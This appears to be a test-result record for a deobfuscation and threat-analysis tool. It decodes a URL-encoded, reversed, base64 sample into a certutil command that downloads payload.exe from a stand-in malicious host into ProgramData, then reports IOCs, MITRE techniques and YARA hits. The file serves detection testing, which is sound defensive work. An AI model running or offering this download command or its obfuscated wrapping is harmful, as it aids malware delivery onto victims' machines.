@@ -1,0 +1,724 @@
+{
+  "sample_id": "R2_S03_certutil_3layer",
+  "wrap": "URL(rev(b64(P)))",
+  "input": "%3DUGel5SYcFGdhRUbhJ3ZvJHUcpzQgUGel5CZh9Gb5FGcvUGbw1WY4VmLzV3bpNWasFWbv8iOwRHdoBiZtACdpxGcz1CIlh2YhNGbyVXLgwWa0VHdyV2Y",
+  "input_sha1": "a7c1a4fd40e8bda1766e780e4eeb468b3ff1dfb2",
+  "expected_plaintext": "certutil -urlcache -split -f http://malicious.example/payload.exe C:\\ProgramData\\a.exe",
+  "expected_token": "certutil",
+  "http_ms": 13906,
+  "status": 200,
+  "response": {
+    "recipe": [
+      {
+        "op": "url-decode",
+        "args": {},
+        "reason": "URL percent-encoded characters"
+      },
+      {
+        "op": "reverse",
+        "args": {},
+        "reason": "Applied reverse"
+      },
+      {
+        "op": "base64-decode",
+        "args": {},
+        "reason": "Base64-encoded payload detected"
+      },
+      {
+        "op": "certutil-annotate",
+        "args": {},
+        "reason": "Applied certutil-annotate"
+      }
+    ],
+    "output": "# --- Certutil LOLBAS Workflow Detected ---\n# T1105 \u00b7 Ingress Tool Transfer (certutil -urlcache)\ncertutil -urlcache -split -f http://malicious.example/payload.exe C:\\ProgramData\\a.exe\n\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\nNIVXRAY INVESTIGATION SUMMARY\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n  Engine:      smart+archetype:CERTUTIL_DOWNLOAD_DECODE_WORKFLOW \u00b7 conf 100/100\n  Chain:       url-decode \u2192 reverse \u2192 base64-decode \u2192 certutil-annotate\n\n  MITRE ATT&CK\n    T1105        \u00b7 Command and Control\n    T1074.001    \u00b7 Collection\n\n  LOLBIN       certutil.exe\n\n  IOCs\n    URL       http://malicious.example/payload.exe\n    Domain    malicious.example\n\n  Behavior\n    1. Transfers a tool from a remote host (T1105)\n\n  Per-layer decoded outputs available in the Chain / Trace panel \u2191\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501",
+    "notes": [
+      "Matched named wrapper archetype: Certutil download-and-decode workflow \u2014 annotates certutil -urlcache/-decode/-encode as the LOLBAS download+decode primitive used for stager delivery."
+    ],
+    "detected_type": null,
+    "engine": "smart+archetype:CERTUTIL_DOWNLOAD_DECODE_WORKFLOW",
+    "reached_shellcode": false,
+    "confidence": 100,
+    "trace": [
+      {
+        "op": "url-decode",
+        "args": {},
+        "reason": "URL percent-encoded characters",
+        "output_preview": "=UGel5SYcFGdhRUbhJ3ZvJHUcpzQgUGel5CZh9Gb5FGcvUGbw1WY4VmLzV3bpNWasFWbv8iOwRHdoBiZtACdpxGcz1CIlh2YhNGbyVXLgwWa0VHdyV2Y",
+        "output_length": 116,
+        "evidence": {
+          "encoding": "URL percent-encoding",
+          "op": "url-decode",
+          "length": 116,
+          "ascii": true,
+          "entropy": 5.324,
+          "hex_preview": "3d 55 47 65 6c 35 53 59 63 46 47 64 68 52 55 62 \u2026",
+          "integrity": {
+            "ok": true,
+            "reason": null
+          }
+        }
+      },
+      {
+        "op": "reverse",
+        "args": {},
+        "reason": "Applied reverse",
+        "output_preview": "Y2VydHV0aWwgLXVybGNhY2hlIC1zcGxpdCAtZiBodHRwOi8vbWFsaWNpb3VzLmV4YW1wbGUvcGF5bG9hZC5leGUgQzpcUHJvZ3JhbURhdGFcYS5leGU=",
+        "output_length": 116,
+        "evidence": {
+          "encoding": "String reversal",
+          "op": "reverse",
+          "length": 116,
+          "ascii": true,
+          "entropy": 5.324,
+          "hex_preview": "59 32 56 79 64 48 56 30 61 57 77 67 4c 58 56 79 \u2026",
+          "integrity": {
+            "ok": true,
+            "reason": null
+          }
+        }
+      },
+      {
+        "op": "base64-decode",
+        "args": {},
+        "reason": "Base64-encoded payload detected",
+        "output_preview": "certutil -urlcache -split -f http://malicious.example/payload.exe C:\\ProgramData\\a.exe",
+        "output_length": 86,
+        "evidence": {
+          "encoding": "Base64 (RFC 4648)",
+          "op": "base64-decode",
+          "length": 86,
+          "ascii": true,
+          "entropy": 4.468,
+          "hex_preview": "63 65 72 74 75 74 69 6c 20 2d 75 72 6c 63 61 63 \u2026",
+          "integrity": {
+            "ok": true,
+            "reason": null
+          }
+        }
+      },
+      {
+        "op": "certutil-annotate",
+        "args": {},
+        "reason": "Applied certutil-annotate",
+        "output_preview": "certutil -urlcache -split -f http://malicious.example/payload.exe C:\\ProgramData\\a.exe",
+        "output_length": 86,
+        "evidence": {
+          "encoding": "certutil-annotate",
+          "op": "certutil-annotate",
+          "length": 86,
+          "ascii": true,
+          "entropy": 4.468,
+          "hex_preview": "63 65 72 74 75 74 69 6c 20 2d 75 72 6c 63 61 63 \u2026",
+          "integrity": {
+            "ok": true,
+            "reason": null
+          }
+        }
+      }
+    ],
+    "chain_ids": [
+      "url-decode",
+      "reverse",
+      "base64-decode",
+      "certutil-annotate"
+    ],
+    "score": 100,
+    "custom_recipes_matched": [],
+    "boost": {
+      "enabled": true,
+      "signal_kind": "unknown",
+      "chain": [
+        "ps-join-char-array"
+      ],
+      "source": "history",
+      "confidence": 1.0,
+      "alternatives": [
+        {
+          "chain": [
+            "env-expand"
+          ],
+          "score": 40,
+          "source": "history"
+        },
+        {
+          "chain": [
+            "extract-b64",
+            "utf16le-or-utf8-decode"
+          ],
+          "score": 38,
+          "source": "history"
+        },
+        {
+          "chain": [
+            "extract-payload",
+            "base64-decode",
+            "xor",
+            "gzip-decompress"
+          ],
+          "score": 30,
+          "source": "history"
+        },
+        {
+          "chain": [
+            "batch-var-slice"
+          ],
+          "score": 30,
+          "source": "history"
+        }
+      ],
+      "signals": {
+        "length": 118,
+        "length_bucket": "s",
+        "entropy": 5.352,
+        "b64_density": 0.992,
+        "has_powershell": false,
+        "has_encoded_cmd": false,
+        "has_iwr": false,
+        "has_downloadstr": false,
+        "has_gzip_prefix": false,
+        "has_zlib_prefix": false,
+        "has_utf16le_hint": false,
+        "has_curl_pipe": false,
+        "has_wget_pipe": false,
+        "has_bash_prefix": false,
+        "has_mshta": false,
+        "has_certutil": false,
+        "has_rundll32": false,
+        "has_regsvr32": false,
+        "has_hex_stream": false,
+        "has_unicode_esc": false,
+        "has_url_encoded": false,
+        "has_html_entities": false,
+        "has_defanged": false,
+        "has_reg_persist": false,
+        "has_charcode": false
+      }
+    },
+    "boost_hit": false,
+    "corrupted_container": null,
+    "reasoning": {
+      "mode": "balanced",
+      "input_profile": {
+        "kind": "mixed",
+        "entropy": 5.352,
+        "length": 118,
+        "letter_ratio": 0.873,
+        "digit_ratio": 0.119,
+        "punct_ratio": 0.008,
+        "space_ratio": 0.0,
+        "non_printable_ratio": 0.0,
+        "upper_ratio": 0.524,
+        "priors": [],
+        "reasons": [
+          "mixed-shape"
+        ]
+      },
+      "output_profile": {
+        "kind": "text_like",
+        "entropy": 4.898,
+        "length": 183,
+        "letter_ratio": 0.732,
+        "digit_ratio": 0.022,
+        "punct_ratio": 0.137,
+        "space_ratio": 0.109,
+        "non_printable_ratio": 0.0,
+        "upper_ratio": 0.119,
+        "priors": [
+          "rot-n-brute",
+          "atbash",
+          "reverse",
+          "xor-single-byte"
+        ],
+        "reasons": [
+          "text-shape"
+        ]
+      },
+      "input_linguistic_score": 0.0219,
+      "output_linguistic_score": 1.0,
+      "linguistic_delta": 0.9781,
+      "confidence": {
+        "confidence": 0.8191,
+        "band": "high",
+        "structural": 0.7,
+        "readability": 0.997,
+        "entropy_sanity": 0.8,
+        "context": 0.75,
+        "weights": {
+          "structural": 0.3,
+          "readability": 0.3,
+          "entropy_sanity": 0.2,
+          "context": 0.2
+        },
+        "reasons": [
+          "structural: inferred-valid (printable=0.99)",
+          "readability: printable=0.99, linguistic=1.00",
+          "entropy: mixed-content-entropy=4.90",
+          "context: output-has-actionable-tokens"
+        ],
+        "dimensions": {
+          "structural": {
+            "score": 0.7,
+            "reason": "inferred-valid (printable=0.99)"
+          },
+          "readability": {
+            "score": 0.997,
+            "reason": "printable=0.99, linguistic=1.00"
+          },
+          "entropy_sanity": {
+            "score": 0.8,
+            "reason": "mixed-content-entropy=4.90"
+          },
+          "context": {
+            "score": 0.75,
+            "reason": "output-has-actionable-tokens"
+          }
+        }
+      },
+      "explanation": "Chain [url-decode \u2192 reverse \u2192 base64-decode \u2192 certutil-annotate] substantially improved readability (\u0394=+0.978 linguistic score). Selected by evidence-based scoring: structural validity, printable ratio, English density, and analyst-keyword hits.",
+      "narrative": null,
+      "trace": null
+    },
+    "layer_trace": [
+      {
+        "layer": "L0",
+        "engine": "archetype",
+        "chain_len": 1,
+        "score": 1.0,
+        "verdict": "matched"
+      },
+      {
+        "layer": "L1",
+        "engine": "smart",
+        "chain_len": 0,
+        "score": 0.0,
+        "verdict": "skipped"
+      },
+      {
+        "layer": "L2",
+        "engine": "magic",
+        "chain_len": 0,
+        "score": 0.0,
+        "verdict": "skipped"
+      }
+    ],
+    "l3_metadata": null,
+    "layer_iocs": [
+      {
+        "layer": 3,
+        "op": "base64-decode",
+        "iocs": {
+          "urls": [
+            "http://malicious.example/payload.exe"
+          ],
+          "ips": [],
+          "domains": [
+            "malicious.example"
+          ],
+          "emails": [],
+          "md5": [],
+          "sha1": [],
+          "sha256": [],
+          "bitcoin_addresses": []
+        },
+        "lolbas": [
+          {
+            "binary": "certutil.exe",
+            "purposes": [
+              "Download",
+              "Decode",
+              "AWL Bypass"
+            ],
+            "mitre": [
+              "T1140",
+              "T1105",
+              "T1218"
+            ],
+            "description": "certutil abused for base64/hex decode of staged payloads and remote download",
+            "snippet": "certutil -urlcache -split -f http://malicious.example/payload.exe C:\\ProgramData\\a.exe",
+            "url": "https://lolbas-project.github.io/lolbas/Binaries/certutil/",
+            "source": "curated"
+          }
+        ]
+      },
+      {
+        "layer": 4,
+        "op": "certutil-annotate",
+        "iocs": {
+          "urls": [
+            "http://malicious.example/payload.exe"
+          ],
+          "ips": [],
+          "domains": [
+            "malicious.example"
+          ],
+          "emails": [],
+          "md5": [],
+          "sha1": [],
+          "sha256": [],
+          "bitcoin_addresses": []
+        },
+        "lolbas": [
+          {
+            "binary": "certutil.exe",
+            "purposes": [
+              "Download",
+              "Decode",
+              "AWL Bypass"
+            ],
+            "mitre": [
+              "T1140",
+              "T1105",
+              "T1218"
+            ],
+            "description": "certutil abused for base64/hex decode of staged payloads and remote download",
+            "snippet": "certutil -urlcache -split -f http://malicious.example/payload.exe C:\\ProgramData\\a.exe",
+            "url": "https://lolbas-project.github.io/lolbas/Binaries/certutil/",
+            "source": "curated"
+          }
+        ]
+      }
+    ],
+    "analysis_mode": "balanced",
+    "verdict_card": {
+      "label": "Malicious",
+      "confidence": 70,
+      "reason": "URL surfaced in decoded output: http://malicious.example/payload.exe.",
+      "indicators": [
+        {
+          "label": "Low entropy (4.90) \u2014 data is likely readable / ASCII text",
+          "kind": "neutral"
+        },
+        {
+          "label": "URL percent-encoding layer peeled",
+          "kind": "neutral"
+        },
+        {
+          "label": "String reversal layer peeled",
+          "kind": "neutral"
+        },
+        {
+          "label": "Base64 (RFC 4648) layer peeled",
+          "kind": "neutral"
+        },
+        {
+          "label": "URL surfaced in decoded output: http://malicious.example/payload.exe",
+          "kind": "positive"
+        }
+      ],
+      "recommended_action": "Contain source host, hunt for parent process, submit to sandbox / VirusTotal, and correlate URL / MITRE mapping."
+    },
+    "mode": "strict",
+    "risk": {
+      "verdict": "Malicious",
+      "level": "malicious",
+      "score": 70
+    },
+    "iocs": {
+      "urls": [
+        "http://malicious.example/payload.exe"
+      ],
+      "ips": [],
+      "domains": [
+        "malicious.example"
+      ],
+      "emails": [],
+      "md5": [],
+      "sha1": [],
+      "sha256": [],
+      "bitcoin_addresses": []
+    },
+    "mitre": [
+      {
+        "id": "T1105",
+        "technique": "Ingress Tool Transfer",
+        "tactic": "Command and Control"
+      },
+      {
+        "id": "T1074.001",
+        "technique": "Local staging in Public/ProgramData/Temp directory",
+        "tactic": "Collection"
+      }
+    ],
+    "lolbas": [
+      {
+        "binary": "certutil.exe",
+        "purposes": [
+          "Download",
+          "Decode",
+          "AWL Bypass"
+        ],
+        "mitre": [
+          "T1140",
+          "T1105",
+          "T1218"
+        ],
+        "description": "certutil abused for base64/hex decode of staged payloads and remote download",
+        "snippet": "LgwWa0VHdyV2Y # --- Certutil LOLBAS Workflow Detected --- # T1105 \u00b7 Ingress Tool Transfer (certutil -urlcache) certutil -urlcache -split -f http://malicious.example/payl",
+        "url": "https://lolbas-project.github.io/lolbas/Binaries/certutil/",
+        "source": "curated"
+      }
+    ],
+    "ti_shield": [
+      {
+        "layer": 0,
+        "label": "L0 \u00b7 RAW INPUT",
+        "op": "raw",
+        "preview": "%3DUGel5SYcFGdhRUbhJ3ZvJHUcpzQgUGel5CZh9Gb5FGcvUGbw1WY4VmLzV3bpNWasFWbv8iOwRHdoBiZtACdpxGcz1CIlh2YhNGbyVXLgwWa0VHdyV2Y",
+        "iocs": {
+          "urls": [],
+          "ips": [],
+          "domains": [],
+          "emails": [],
+          "md5": [],
+          "sha1": [],
+          "sha256": [],
+          "bitcoin_addresses": []
+        },
+        "lolbas": [],
+        "mitre": [],
+        "yara": [
+          {
+            "rule": "Base64_Long_Blob",
+            "severity": "low",
+            "match": "3DUGel5SYcFGdhRUbhJ3ZvJHUcpzQgUGel5CZh9Gb5FGcvUGbw1WY4VmLzV3bpNWasFWbv8iOwRHdoBiZtACdpxGcz1CIlh2YhNGbyVXLgwWa0VHdyV2Y",
+            "description": "Long Base64 blob"
+          }
+        ],
+        "ti_hits": [],
+        "live_osint": {},
+        "family_hint": null,
+        "severity": {
+          "score": 4,
+          "band": "none"
+        }
+      },
+      {
+        "layer": 3,
+        "label": "L3 \u00b7 BASE64-DECODE",
+        "op": "base64-decode",
+        "preview": "http://malicious.example/payload.exe malicious.example",
+        "iocs": {
+          "urls": [
+            "http://malicious.example/payload.exe"
+          ],
+          "ips": [],
+          "domains": [
+            "malicious.example"
+          ],
+          "emails": [],
+          "md5": [],
+          "sha1": [],
+          "sha256": [],
+          "bitcoin_addresses": []
+        },
+        "lolbas": [
+          {
+            "binary": "certutil.exe",
+            "purposes": [
+              "Download",
+              "Decode",
+              "AWL Bypass"
+            ],
+            "mitre": [
+              "T1140",
+              "T1105",
+              "T1218"
+            ],
+            "description": "certutil abused for base64/hex decode of staged payloads and remote download",
+            "snippet": "certutil -urlcache -split -f http://malicious.example/payload.exe C:\\ProgramData\\a.exe",
+            "url": "https://lolbas-project.github.io/lolbas/Binaries/certutil/",
+            "source": "curated"
+          }
+        ],
+        "mitre": [],
+        "yara": [
+          {
+            "rule": "PS_CaseMixed_Obfuscation",
+            "severity": "low",
+            "match": "malicious",
+            "description": "Alternating-case keyword obfuscation to evade string-signature detection"
+          }
+        ],
+        "ti_hits": [],
+        "live_osint": {
+          "ips": [],
+          "domains": [
+            {
+              "value": "malicious.example",
+              "classification": {
+                "tld": "example",
+                "is_high_risk_tld": false,
+                "is_onion": false,
+                "length": 17,
+                "has_dashes": false,
+                "num_subdomains": 0
+              },
+              "resolved_ips": [],
+              "urlscan": {
+                "total": 0,
+                "results": []
+              },
+              "otx": null
+            }
+          ],
+          "urls": [
+            {
+              "value": "http://malicious.example/payload.exe",
+              "scheme": "http",
+              "host": "malicious.example",
+              "path": "/payload.exe",
+              "port": null,
+              "is_onion": false,
+              "urlscan": {
+                "total": 0,
+                "results": []
+              },
+              "otx": {
+                "pulse_count": 0,
+                "reputation": null,
+                "pulses": []
+              }
+            }
+          ],
+          "hashes": [],
+          "sources_used": [
+            "ip-api.com (geolocation, no key)",
+            "system DNS (reverse lookup, resolution)",
+            "AbuseIPDB",
+            "URLScan.io",
+            "AlienVault OTX",
+            "Hybrid Analysis"
+          ]
+        },
+        "family_hint": null,
+        "severity": {
+          "score": 16,
+          "band": "low"
+        }
+      },
+      {
+        "layer": 4,
+        "label": "L4 \u00b7 CERTUTIL-ANNOTATE",
+        "op": "certutil-annotate",
+        "preview": "http://malicious.example/payload.exe malicious.example",
+        "iocs": {
+          "urls": [
+            "http://malicious.example/payload.exe"
+          ],
+          "ips": [],
+          "domains": [
+            "malicious.example"
+          ],
+          "emails": [],
+          "md5": [],
+          "sha1": [],
+          "sha256": [],
+          "bitcoin_addresses": []
+        },
+        "lolbas": [
+          {
+            "binary": "certutil.exe",
+            "purposes": [
+              "Download",
+              "Decode",
+              "AWL Bypass"
+            ],
+            "mitre": [
+              "T1140",
+              "T1105",
+              "T1218"
+            ],
+            "description": "certutil abused for base64/hex decode of staged payloads and remote download",
+            "snippet": "certutil -urlcache -split -f http://malicious.example/payload.exe C:\\ProgramData\\a.exe",
+            "url": "https://lolbas-project.github.io/lolbas/Binaries/certutil/",
+            "source": "curated"
+          }
+        ],
+        "mitre": [],
+        "yara": [
+          {
+            "rule": "PS_CaseMixed_Obfuscation",
+            "severity": "low",
+            "match": "malicious",
+            "description": "Alternating-case keyword obfuscation to evade string-signature detection"
+          }
+        ],
+        "ti_hits": [],
+        "live_osint": {},
+        "family_hint": null,
+        "severity": {
+          "score": 16,
+          "band": "low"
+        }
+      },
+      {
+        "layer": "final",
+        "label": "L-FINAL \u00b7 DECODED PAYLOAD",
+        "op": "final",
+        "preview": "# --- Certutil LOLBAS Workflow Detected ---\n# T1105 \u00b7 Ingress Tool Transfer (certutil -urlcache)\ncertutil -urlcache -split -f http://malicious.example/payload.exe C:\\ProgramData\\a.exe",
+        "iocs": {
+          "urls": [
+            "http://malicious.example/payload.exe"
+          ],
+          "ips": [],
+          "domains": [
+            "malicious.example"
+          ],
+          "emails": [],
+          "md5": [],
+          "sha1": [],
+          "sha256": [],
+          "bitcoin_addresses": []
+        },
+        "lolbas": [
+          {
+            "binary": "certutil.exe",
+            "purposes": [
+              "Download",
+              "Decode",
+              "AWL Bypass"
+            ],
+            "mitre": [
+              "T1140",
+              "T1105",
+              "T1218"
+            ],
+            "description": "certutil abused for base64/hex decode of staged payloads and remote download",
+            "snippet": "# --- Certutil LOLBAS Workflow Detected --- # T1105 \u00b7 Ingress Tool Transfer (certutil -urlcache) certutil -urlcache -split -f http://malicious.example/payl",
+            "url": "https://lolbas-project.github.io/lolbas/Binaries/certutil/",
+            "source": "curated"
+          }
+        ],
+        "mitre": [
+          {
+            "id": "T1105",
+            "technique": "Ingress Tool Transfer",
+            "tactic": "Command and Control"
+          },
+          {
+            "id": "T1074.001",
+            "technique": "Local staging in Public/ProgramData/Temp directory",
+            "tactic": "Collection"
+          }
+        ],
+        "yara": [
+          {
+            "rule": "PS_CaseMixed_Obfuscation",
+            "severity": "low",
+            "match": "Certutil",
+            "description": "Alternating-case keyword obfuscation to evade string-signature detection"
+          }
+        ],
+        "ti_hits": [],
+        "live_osint": {},
+        "family_hint": null,
+        "severity": {
+          "score": 26,
+          "band": "low"
+        }
+      }
+    ],
+    "output_raw": "# --- Certutil LOLBAS Workflow Detected ---\n# T1105 \u00b7 Ingress Tool Transfer (certutil -urlcache)\ncertutil -urlcache -split -f http://malicious.example/payload.exe C:\\ProgramData\\a.exe",
+    "report_text": "\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\nNIVXRAY INVESTIGATION SUMMARY\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n  Engine:      smart+archetype:CERTUTIL_DOWNLOAD_DECODE_WORKFLOW \u00b7 conf 100/100\n  Chain:       url-decode \u2192 reverse \u2192 base64-decode \u2192 certutil-annotate\n\n  MITRE ATT&CK\n    T1105        \u00b7 Command and Control\n    T1074.001    \u00b7 Collection\n\n  LOLBIN       certutil.exe\n\n  IOCs\n    URL       http://malicious.example/payload.exe\n    Domain    malicious.example\n\n  Behavior\n    1. Transfers a tool from a remote host (T1105)\n\n  Per-layer decoded outputs available in the Chain / Trace panel \u2191\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501"
+  }
+}
